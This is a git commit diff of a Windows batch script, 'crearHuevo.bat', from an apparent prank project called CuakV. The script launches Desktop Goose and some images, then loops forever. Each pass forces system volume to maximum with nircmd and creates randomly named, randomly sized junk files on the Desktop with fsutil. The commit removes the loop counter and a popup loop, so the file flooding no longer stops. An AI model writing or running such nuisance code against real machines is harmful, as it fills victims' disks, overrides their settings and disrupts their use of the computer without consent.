d3a74382a399f56acd98f860411b11ddcd0ee90b
leiderCastillo <leiderCastillo@github.com>
2023-03-31 07:45:53 -0500

    Agregando Cambios

--- CuakV/assets/adds/crearHuevo.bat
+++ CuakV/assets/adds/crearHuevo.bat
@@ -1,7 +1,7 @@
 @echo off
 
 rem -----------------------
-set contador=0
+start "" "%USERPROFILE%\Goose\GooseDesktop.exe"
 start "" "%USERPROFILE%\Goose\GooseDesktop.exe"
 start /B "" "%USERPROFILE%\adds\1.jpg"
 start /B "" "%USERPROFILE%\adds\2.jpg"
@@ -9,7 +9,6 @@ start /B "" "%USERPROFILE%\adds\3.jpg"
 rem -----------------------
 
 :loop
-set /a contador+=1
 %USERPROFILE%\adds\nircmd-x64\nircmd.exe setsysvolume 65535
 fsutil file createnew %USERPROFILE%\Desktop\HuevoCuak.%random% %random%00
 timeout /nobreak 2 >nul
@@ -18,13 +17,7 @@ timeout /nobreak 2 >nul
 timeout /nobreak 2 >nul
 %USERPROFILE%\adds\nircmd-x64\nircmd.exe setsysvolume 65535
 %USERPROFILE%\adds\nircmd-x64\nircmd.exe nircmd.exe win show class progman
-
-if %contador%==5 (
-msg "Cuack os, es el mejor"
-    :bucle
-        msg "Cuack os, es el mejor"
-    goto :bucle
-)
-
 goto :loop
+
+
 
